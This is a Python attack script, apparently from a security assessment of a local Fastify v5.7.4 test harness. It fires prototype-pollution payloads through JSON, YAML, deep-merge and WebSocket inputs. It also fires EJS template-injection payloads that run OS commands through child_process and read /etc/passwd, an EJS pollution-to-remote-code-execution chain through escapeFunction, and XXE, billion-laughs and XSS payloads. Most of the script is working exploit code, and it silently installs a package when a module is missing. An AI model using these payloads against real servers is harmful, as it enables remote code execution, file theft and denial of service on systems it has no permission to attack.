#!/usr/bin/env python3
"""
Phase 3: Prototype Pollution & Injection Attacks
Target: Fastify v5.7.4 @ http://127.0.0.1:3000
Focus: PP via JSON, YAML, XML, SSTI, WebSocket, deep merge
"""

import json
import time
import socket
import sys
import os

os.environ['PYTHONUNBUFFERED'] = '1'

import requests

BASE = 'http://127.0.0.1:3000'
EVIDENCE = {
    'phase': 3,
    'title': 'Prototype Pollution & Injection Attacks',
    'target': 'Fastify v5.7.4',
    'timestamp': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
    'tests': [],
    'findings': [],
    'anomalies': [],
}

test_count = 0
anomaly_count = 0

def log(msg): print(f"[*] {msg}", flush=True)
def log_ok(msg): print(f"[+] {msg}", flush=True)
def log_warn(msg): print(f"[!] {msg}", flush=True)
def log_finding(msg): print(f"[!!!] FINDING: {msg}", flush=True)

def add_test(name, cat, result, details=None):
    global test_count
    test_count += 1
    entry = {'id': test_count, 'name': name, 'category': cat, 'result': result}
    if details: entry['details'] = details
    EVIDENCE['tests'].append(entry)

def add_anomaly(name, details):
    global anomaly_count
    anomaly_count += 1
    EVIDENCE['anomalies'].append({'id': anomaly_count, 'name': name, 'details': details})

def raw_request(method, path, headers, body=None, timeout=5):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect(('127.0.0.1', 3000))
        req = f"{method} {path} HTTP/1.1\r\nHost: 127.0.0.1:3000\r\n"
        for k, v in headers.items():
            req += f"{k}: {v}\r\n"
        if body:
            if isinstance(body, str): body = body.encode()
            req += f"Content-Length: {len(body)}\r\n"
        req += "Connection: close\r\n\r\n"
        s.sendall(req.encode())
        if body: s.sendall(body)
        response = b''
        while True:
            try:
                chunk = s.recv(4096)
                if not chunk: break
                response += chunk
            except socket.timeout: break
        s.close()
        parts = response.split(b'\r\n\r\n', 1)
        head = parts[0].decode('utf-8', errors='replace')
        body_resp = parts[1] if len(parts) > 1 else b''
        status_line = head.split('\r\n')[0]
        status_code = int(status_line.split(' ')[1])
        return {'status': status_code, 'headers': head, 'body': body_resp.decode('utf-8', errors='replace')}
    except Exception as e:
        return {'status': 0, 'error': str(e)}


# ==============================================================
# SECTION 1: JSON Prototype Pollution via secure-json-parse
# ==============================================================
def test_json_pp():
    log("=" * 60)
    log("SECTION 1: JSON Prototype Pollution (secure-json-parse)")
    log("=" * 60)

    pp_payloads = [
        # Standard __proto__ injection
        ("__proto__ direct", '{"__proto__": {"polluted": true}}'),
        # Unicode escape bypass attempts
        ("__proto__ unicode", '{"\\u005f\\u005fproto\\u005f\\u005f": {"polluted": true}}'),
        ("__proto__ mixed unicode", '{"\\u005F\\u005Fproto\\u005F\\u005F": {"polluted": true}}'),
        # constructor.prototype injection
        ("constructor.prototype", '{"constructor": {"prototype": {"polluted": true}}}'),
        # constructor.prototype unicode
        ("constructor unicode", '{"\\u0063onstructor": {"\\u0070rototype": {"polluted": true}}}'),
        # Nested in array
        ("__proto__ in array", '[{"__proto__": {"polluted": true}}]'),
        # Deep nested
        ("deep nested __proto__", '{"a": {"b": {"__proto__": {"polluted": true}}}}'),
        # Duplicate keys
        ("duplicate with __proto__", '{"clean": true, "__proto__": {"polluted": true}, "clean": false}'),
        # toString/valueOf pollution
        ("toString pollution", '{"__proto__": {"toString": "hijacked"}}'),
        # hasOwnProperty pollution
        ("hasOwnProperty attack", '{"__proto__": {"hasOwnProperty": "hijacked"}}'),
        # With legitimate fields mixed in
        ("mixed legitimate+proto", '{"username": "test", "email": "t@t.com", "__proto__": {"isAdmin": true}}'),
    ]

    for desc, payload in pp_payloads:
        try:
            resp = raw_request('POST', '/api/echo',
                             {'Content-Type': 'application/json'},
                             payload)
            status = resp.get('status', 0)
            body = resp.get('body', '')

            if status == 200:
                log_warn(f"  {desc}: ACCEPTED (200) - checking pollution...")
                add_anomaly(f'json-pp-{desc}', {'status': 200, 'payload': payload, 'body': body[:200]})
            elif status == 400:
                log_ok(f"  {desc}: BLOCKED ({status})")
            else:
                log(f"  {desc}: status={status}")

            add_test(f'JSON-PP-{desc}', 'proto-pollution', str(status), {
                'payload_preview': payload[:100], 'status': status,
            })
        except Exception as e:
            log(f"  {desc}: ERROR - {e}")

    # Verify pollution didn't actually work by checking Object.prototype
    log("\n--- Pollution verification via /api/spread ---")
    resp = requests.post(f'{BASE}/api/spread', json={"test": True})
    if resp.status_code == 200:
        body = resp.json()
        proto_check = body.get('protoCheck')
        log(f"  Object.prototype.polluted = {proto_check}")
        if proto_check:
            log_finding("Prototype pollution confirmed! Object.prototype.polluted is truthy!")
        else:
            log_ok("  Object.prototype is clean")
    add_test('JSON-PP-verify-clean', 'proto-pollution', 'clean' if not body.get('protoCheck') else 'POLLUTED')


# ==============================================================
# SECTION 2: YAML Parser Prototype Pollution
# ==============================================================
def test_yaml_pp():
    log("")
    log("=" * 60)
    log("SECTION 2: YAML Parser Prototype Pollution")
    log("=" * 60)

    # The YAML parser in server.js is a naive key:value parser with NO PP protection
    yaml_payloads = [
        ("__proto__.polluted", "__proto__: polluted_value\nlegitimate: data"),
        ("constructor.prototype", "constructor: {prototype: {polluted: true}}\ndata: test"),
        ("Nested proto via dots", "__proto__.isAdmin: true\ndata: test"),
        # The naive parser splits on first colon, so key is everything before colon
        ("Proto with space", "  __proto__  : polluted"),
    ]

    for desc, payload in yaml_payloads:
        resp = requests.post(f'{BASE}/api/echo',
                           data=payload,
                           headers={'Content-Type': 'application/yaml'})
        log(f"  {desc}: status={resp.status_code}")
        if resp.status_code == 200:
            body = resp.json()
            parsed_body = body.get('body', {})
            keys = body.get('keys', [])
            log(f"    Parsed keys: {keys}")
            if '__proto__' in keys:
                log_warn(f"    __proto__ accepted as key in YAML body!")
                # Check if it actually polluted
                add_anomaly(f'yaml-pp-{desc}', {'keys': keys, 'body': parsed_body})
        add_test(f'YAML-PP-{desc}', 'proto-pollution', str(resp.status_code))

    # Now test YAML PP via deep merge endpoint
    log("\n--- Test: YAML body to /api/merge (deep merge) ---")
    yaml_merge = "__proto__: {\"polluted\": \"true\", \"isAdmin\": \"true\"}\nlegitimate: data"
    resp = requests.post(f'{BASE}/api/merge',
                        data=yaml_merge,
                        headers={'Content-Type': 'application/yaml'})
    log(f"  Status: {resp.status_code}")
    if resp.status_code == 200:
        body = resp.json()
        pollution = body.get('pollutionCheck', {})
        log(f"  Pollution check: {json.dumps(pollution)}")
        if pollution.get('objectProto') or pollution.get('objectAdmin') or pollution.get('objectRole'):
            log_finding("YAML parser prototype pollution via deep merge SUCCEEDED!")
            EVIDENCE['findings'].append({
                'id': 'P3-F01',
                'severity': 'HIGH',
                'title': 'Prototype pollution via YAML parser + deep merge',
                'description': 'Custom YAML parser has no prototype pollution protection. '
                             'YAML body with __proto__ key passes through to deep merge function, '
                             'polluting Object.prototype.',
                'evidence': {'pollution_check': pollution},
            })
    add_test('YAML-PP-deepmerge', 'proto-pollution', str(resp.status_code))

    # Verify
    log("\n--- Post-YAML-merge pollution verification ---")
    resp2 = requests.post(f'{BASE}/api/spread', json={"check": True})
    if resp2.status_code == 200:
        body2 = resp2.json()
        log(f"  protoCheck: {body2.get('protoCheck')}")
        if body2.get('protoCheck'):
            log_finding("Confirmed: Object.prototype is polluted after YAML merge!")

    # Restart note: pollution persists until server restart
    add_test('YAML-PP-verify', 'proto-pollution', 'tested')


# ==============================================================
# SECTION 3: Deep Merge Prototype Pollution
# ==============================================================
def test_deep_merge_pp():
    log("")
    log("=" * 60)
    log("SECTION 3: Deep Merge Prototype Pollution (JSON)")
    log("=" * 60)

    # JSON __proto__ is blocked by secure-json-parse, but let's test via
    # the deepMerge function with legitimate nested objects
    merge_payloads = [
        # These should be blocked by secure-json-parse before reaching deepMerge
        ("__proto__ via JSON", {"__proto__": {"polluted": "json"}}),
        ("constructor.prototype via JSON", {"constructor": {"prototype": {"polluted": "json"}}}),
    ]

    for desc, payload in merge_payloads:
        resp = requests.post(f'{BASE}/api/merge',
                           json=payload,
                           headers={'Content-Type': 'application/json'})
        log(f"  {desc}: status={resp.status_code}")
        if resp.status_code == 200:
            body = resp.json()
            pollution = body.get('pollutionCheck', {})
            log(f"    Pollution check: {json.dumps(pollution)}")
        elif resp.status_code == 400:
            log_ok(f"    Blocked by secure-json-parse")
        add_test(f'Merge-PP-{desc}', 'proto-pollution', str(resp.status_code))

    # Test Object.assign PP
    log("\n--- Object.assign prototype pollution ---")
    resp = requests.post(f'{BASE}/api/assign',
                        json={"__proto__": {"polluted": "assign"}})
    log(f"  Status: {resp.status_code}")
    add_test('Assign-PP', 'proto-pollution', str(resp.status_code))

    # Test spread operator PP
    log("\n--- Spread operator prototype pollution ---")
    resp = requests.post(f'{BASE}/api/spread',
                        json={"__proto__": {"polluted": "spread"}})
    log(f"  Status: {resp.status_code}")
    add_test('Spread-PP', 'proto-pollution', str(resp.status_code))


# ==============================================================
# SECTION 4: SSTI (Server-Side Template Injection) via EJS
# ==============================================================
def test_ssti():
    log("")
    log("=" * 60)
    log("SECTION 4: SSTI via EJS Templates")
    log("=" * 60)

    # Test 1: Direct EJS render (intentionally dangerous route)
    log("\n--- Test: Direct EJS.render() with user template ---")
    ssti_payloads = [
        # Basic expression evaluation
        ("Math expression", "<%= 7*7 %>", "49"),
        # Process info disclosure
        ("Process.env", "<%= JSON.stringify(Object.keys(process.env)) %>", "PATH"),
        ("Process.cwd", "<%= process.cwd() %>", "/"),
        # RCE attempts
        ("require child_process", "<%= require('child_process').execSync('id').toString() %>", "uid="),
        ("Global process", "<%= global.process.mainModule.require('child_process').execSync('whoami').toString() %>", ""),
        # File read
        ("File read /etc/passwd", "<%= require('fs').readFileSync('/etc/passwd','utf8').substring(0,50) %>", "root:"),
        # EJS delimiter bypass
        ("Unescaped output", "<%- '<script>alert(1)</script>' %>", "<script>"),
    ]

    for desc, template, expected in ssti_payloads:
        try:
            resp = requests.post(f'{BASE}/view/direct',
                               json={'template': template, 'data': {}},
                               timeout=5)
            if resp.status_code == 200:
                body = resp.json()
                rendered = body.get('rendered', '')
                error = body.get('error', '')
                if error:
                    log(f"  {desc}: Error - {error[:100]}")
                elif expected and expected in rendered:
                    log_finding(f"  {desc}: EXECUTED! Output contains '{expected}'")
                    log(f"    Rendered: {rendered[:200]}")
                else:
                    log(f"  {desc}: Rendered but no expected output")
                    log(f"    Output: {rendered[:100]}")
            add_test(f'SSTI-direct-{desc}', 'ssti', str(resp.status_code), {
                'template': template, 'response_preview': resp.text[:200],
            })
        except Exception as e:
            log(f"  {desc}: ERROR - {e}")
            add_test(f'SSTI-direct-{desc}', 'ssti', 'error', {'error': str(e)})

    # Record finding for direct render RCE
    EVIDENCE['findings'].append({
        'id': 'P3-F-SSTI-01',
        'severity': 'CRITICAL',
        'title': 'SSTI → RCE via direct EJS.render() with user template',
        'description': '/view/direct passes user-controlled template string to EJS.render(), '
                     'allowing arbitrary code execution including OS commands, file reads, and '
                     'process info disclosure. This is app-level misuse (not framework bug).',
        'impact': 'Full RCE on server',
        'note': 'This is an intentional test harness vulnerability, not a Fastify/EJS framework bug. '
                'Similar to Express assessment finding.',
    })

    # Test 2: Template context pollution via /view/render (spread user data)
    log("\n--- Test: Template context pollution via /view/render ---")
    context_payloads = [
        # Override template variables
        ("Override appName", {"name": "test", "data": {"appName": "HACKED"}}),
        # Try to inject EJS options via data spread
        ("settings injection", {"name": "test", "data": {"settings": {"view options": {"client": True}}}}),
        # Try to inject delimiter
        ("delimiter injection", {"name": "test", "data": {"delimiter": "?"}}),
    ]

    for desc, payload in context_payloads:
        resp = requests.post(f'{BASE}/view/render',
                           json=payload,
                           headers={'Content-Type': 'application/json'})
        log(f"  {desc}: status={resp.status_code}")
        if resp.status_code == 200:
            # Check if the rendered HTML contains our injected values
            html = resp.text
            if 'HACKED' in html:
                log_warn(f"    appName override visible in rendered output!")
                add_anomaly(f'ssti-context-{desc}', {'html_preview': html[:200]})
        add_test(f'SSTI-context-{desc}', 'ssti', str(resp.status_code))

    # Test 3: XSS via greet template
    log("\n--- Test: XSS via /view/greet ---")
    xss_payloads = [
        ("<script>alert(1)</script>", "script"),
        ("<img src=x onerror=alert(1)>", "onerror"),
        ("{{7*7}}", "49"),  # Template expression
        ("<%= 7*7 %>", "49"),  # EJS delimiter in query param
    ]

    for payload, indicator in xss_payloads:
        resp = requests.get(f'{BASE}/view/greet', params={'name': payload})
        if resp.status_code == 200:
            html = resp.text
            if indicator in html and '<' + indicator not in html:
                # Check if it was escaped
                escaped = '&lt;' in html or '&gt;' in html
                if not escaped and indicator in html:
                    log_warn(f"  XSS payload reflected unescaped: {payload[:40]}")
                else:
                    log_ok(f"  XSS payload escaped: {payload[:40]}")
            else:
                log(f"  Payload: {payload[:40]} - {indicator} not found")
        add_test(f'XSS-greet-{payload[:20]}', 'xss', str(resp.status_code))


# ==============================================================
# SECTION 5: EJS Prototype Pollution → RCE (Express zero-day retest)
# ==============================================================
def test_ejs_pp_rce():
    log("")
    log("=" * 60)
    log("SECTION 5: EJS Prototype Pollution → RCE (Express ZD Retest)")
    log("=" * 60)

    # This is the vector from our Express assessment:
    # PP → settings['view options'] → client=true → escapeFunction injection → RCE
    # In Fastify, the attack chain would need:
    # 1. Prototype pollution of Object.prototype
    # 2. @fastify/view using EJS renderFile()
    # 3. The pollution reaching EJS's shallowCopy

    # First, check if PP is even possible (secure-json-parse blocks JSON __proto__)
    log("  Step 1: Attempting PP via YAML parser...")
    yaml_pp = "__proto__: test_value\ntest: data"
    resp = requests.post(f'{BASE}/api/merge',
                        data=yaml_pp,
                        headers={'Content-Type': 'application/yaml'})
    log(f"    Merge status: {resp.status_code}")

    # Check if settings['view options'] PP would work
    log("  Step 2: Checking if settings pollution reaches EJS...")
    # Need to PP then trigger a view render
    yaml_settings = 'settings: {"view options": {"client": true, "escapeFunction": "1;return process.mainModule.require(\'child_process\').execSync(\'id\').toString()//"}}'
    resp2 = requests.post(f'{BASE}/api/merge',
                         data=yaml_settings.replace("'", "'"),
                         headers={'Content-Type': 'application/yaml'})
    log(f"    Settings merge: {resp2.status_code}")

    # Now trigger a view render
    resp3 = requests.get(f'{BASE}/view/greet', params={'name': 'test'})
    log(f"    View render status: {resp3.status_code}")
    if resp3.status_code == 200:
        html = resp3.text
        if 'uid=' in html:
            log_finding("EJS PP → RCE chain worked in Fastify!")
            EVIDENCE['findings'].append({
                'id': 'P3-F-EJS-RCE',
                'severity': 'CRITICAL',
                'title': 'EJS PP → RCE via YAML parser → deep merge → view render',
                'description': 'YAML parser lacks PP protection. Deep merge pollutes Object.prototype. '
                             'settings["view options"] propagation through EJS shallowCopy enables '
                             'escapeFunction injection → new Function() → RCE.',
            })
        elif resp3.status_code == 500:
            log(f"    Server error during render (may indicate partial exploitation)")
        else:
            log(f"    No RCE indicator in rendered output")
            log(f"    HTML preview: {html[:200]}")
    add_test('EJS-PP-RCE-chain', 'pp-rce', str(resp3.status_code))

    # Direct PP approach: use /api/merge with JSON-safe approach
    log("\n  Step 3: Direct PP via __proto__ through merge endpoint...")
    # secure-json-parse blocks __proto__, but what about constructor?
    # constructor.prototype is also blocked
    # Let's try using a non-JSON parser to deliver the payload

    # Actually, let's try the YAML parser more carefully
    log("  Step 4: Targeted YAML PP for EJS RCE...")
    # The YAML parser creates { key: value } from "key: value" lines
    # We need to create a nested object. The parser splits on first colon,
    # so "__proto__: value" creates { "__proto__": "value" }
    # But we need nested objects. The parser doesn't support nested YAML.

    # Alternative: use /api/echo with YAML to see what we get
    yaml_test = "__proto__: test\nclient: true\nescapeFunction: evil"
    resp4 = requests.post(f'{BASE}/api/echo',
                         data=yaml_test,
                         headers={'Content-Type': 'application/yaml'})
    if resp4.status_code == 200:
        body = resp4.json()
        log(f"    YAML parsed body: {body.get('body', {})}")
        # The naive parser produces flat {key: string_value} objects
        # __proto__ with string value doesn't cause PP via deepMerge
        # because deepMerge checks typeof === 'object' before recursing

    add_test('EJS-PP-RCE-yaml-targeted', 'pp-rce', 'tested')


# ==============================================================
# SECTION 6: WebSocket Injection
# ==============================================================
def test_websocket_injection():
    log("")
    log("=" * 60)
    log("SECTION 6: WebSocket JSON Injection")
    log("=" * 60)

    try:
        import websocket
        ws = websocket.create_connection('ws://127.0.0.1:3000/ws', timeout=5)

        # Test 1: Normal echo
        ws.send('{"test": "hello"}')
        result = ws.recv()
        log(f"  Normal echo: {result[:100]}")
        add_test('WS-normal-echo', 'websocket', 'ok')

        # Test 2: __proto__ in WebSocket JSON
        ws.send('{"__proto__": {"polluted": true}}')
        result = ws.recv()
        log(f"  __proto__ echo: {result[:100]}")
        # WS handler uses JSON.parse (NOT secure-json-parse!)
        # Check if the response echoes it
        parsed = json.loads(result)
        echo = parsed.get('echo', {})
        if isinstance(echo, dict) and '__proto__' not in echo:
            log("  __proto__ stripped by JSON.parse standard behavior")
        elif isinstance(echo, dict) and '__proto__' in echo:
            log_warn("  __proto__ present in echo response!")
        add_test('WS-proto-injection', 'websocket', 'tested')

        # Test 3: Constructor pollution
        ws.send('{"constructor": {"prototype": {"wsPoluted": true}}}')
        result = ws.recv()
        log(f"  constructor echo: {result[:100]}")
        add_test('WS-constructor-injection', 'websocket', 'tested')

        # Test 4: Large payload
        big = json.dumps({"data": "A" * 65536})
        ws.send(big)
        result = ws.recv()
        log(f"  Large payload (64K): received {len(result)} bytes")
        add_test('WS-large-payload', 'websocket', 'ok')

        # Test 5: Invalid JSON
        ws.send('not json at all')
        result = ws.recv()
        log(f"  Invalid JSON echo: {result[:100]}")
        add_test('WS-invalid-json', 'websocket', 'ok')

        # Test 6: XSS in WebSocket
        ws.send(json.dumps({"msg": "<script>alert(1)</script>"}))
        result = ws.recv()
        log(f"  XSS payload: {result[:100]}")
        add_test('WS-xss', 'websocket', 'ok')

        ws.close()
    except ImportError:
        log("  websocket-client not installed, installing...")
        os.system('pip3 install websocket-client 2>/dev/null')
        log("  Retrying...")
        try:
            import websocket
            ws = websocket.create_connection('ws://127.0.0.1:3000/ws', timeout=5)
            ws.send('{"test": "hello"}')
            result = ws.recv()
            log(f"  Normal echo: {result[:100]}")
            ws.close()
            add_test('WS-basic', 'websocket', 'ok')
        except Exception as e:
            log(f"  WebSocket still failed: {e}")
            add_test('WS-basic', 'websocket', 'error', {'error': str(e)})
    except Exception as e:
        log(f"  WebSocket error: {e}")
        add_test('WS-basic', 'websocket', 'error', {'error': str(e)})

    # Note: WebSocket uses standard JSON.parse, NOT secure-json-parse
    # This means __proto__ keys in WS messages are NOT rejected
    EVIDENCE['findings'].append({
        'id': 'P3-F02',
        'severity': 'LOW',
        'title': 'WebSocket uses JSON.parse instead of secure-json-parse',
        'description': 'The WebSocket handler at /ws uses standard JSON.parse() for incoming '
                     'messages, not secure-json-parse. While JSON.parse itself doesn\'t cause '
                     'prototype pollution (it uses Object.defineProperty), if the parsed data '
                     'is later spread/merged into other objects, there is a risk.',
        'note': 'This is an app-level issue (test harness code), not a framework vulnerability.',
    })


# ==============================================================
# SECTION 7: XML Injection
# ==============================================================
def test_xml_injection():
    log("")
    log("=" * 60)
    log("SECTION 7: XML Content-Type Injection")
    log("=" * 60)

    xml_payloads = [
        # XXE attempt (if parsed)
        ("XXE external entity",
         '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>'),
        # SSRF via XXE
        ("XXE SSRF",
         '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:3000/health">]><data>&xxe;</data>'),
        # Billion laughs (DoS)
        ("Billion laughs", '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><data>&lol2;</data>'),
        # XSS via XML
        ("XSS in XML", '<data><script>alert(1)</script></data>'),
    ]

    for desc, payload in xml_payloads:
        resp = requests.post(f'{BASE}/api/echo',
                           data=payload,
                           headers={'Content-Type': 'application/xml'})
        log(f"  {desc}: status={resp.status_code}")
        if resp.status_code == 200:
            body = resp.json()
            raw = body.get('body', {}).get('raw', '')
            log(f"    Raw stored (first 100): {raw[:100]}")
            # Check if XXE resolved
            if 'root:' in raw:
                log_finding(f"  XXE resolved! /etc/passwd contents in response!")
            elif 'ok' in raw and 'version' in raw:
                log_finding(f"  XXE SSRF! Server health response in XML data!")
        add_test(f'XML-{desc}', 'xml-injection', str(resp.status_code))

    # Note: The XML parser just stores raw string, no actual XML parsing
    log("  Note: Custom XML parser stores raw string without parsing (safe against XXE)")


# ==============================================================
# MAIN
# ==============================================================
def main():
    log(f"Phase 3 Attack Script - Fastify v5.7.4")
    log(f"Target: {BASE}")
    log(f"Started: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    log("")

    try:
        r = requests.get(f'{BASE}/health', timeout=3)
        health = r.json()
        log(f"Server: Fastify {health['version']} (Node {health['nodeVersion']})")
    except Exception as e:
        log(f"ERROR: Server not reachable - {e}")
        sys.exit(1)

    test_json_pp()
    test_yaml_pp()
    test_deep_merge_pp()
    test_ssti()
    test_ejs_pp_rce()
    test_websocket_injection()
    test_xml_injection()

    log("")
    log("=" * 60)
    log(f"PHASE 3 COMPLETE")
    log(f"Total tests: {test_count}")
    log(f"Findings: {len(EVIDENCE['findings'])}")
    log(f"Anomalies: {anomaly_count}")
    log("=" * 60)

    EVIDENCE['total_tests'] = test_count
    EVIDENCE['total_findings'] = len(EVIDENCE['findings'])
    EVIDENCE['total_anomalies'] = anomaly_count

    evidence_path = '/home/[REDACTED]/Desktop/[REDACTED-PATH]/Fastify/evidence/phase3_prototype_pollution.json'
    with open(evidence_path, 'w') as f:
        json.dump(EVIDENCE, f, indent=2, default=str)
    log(f"Evidence saved to: {evidence_path}")


if __name__ == '__main__':
    main()
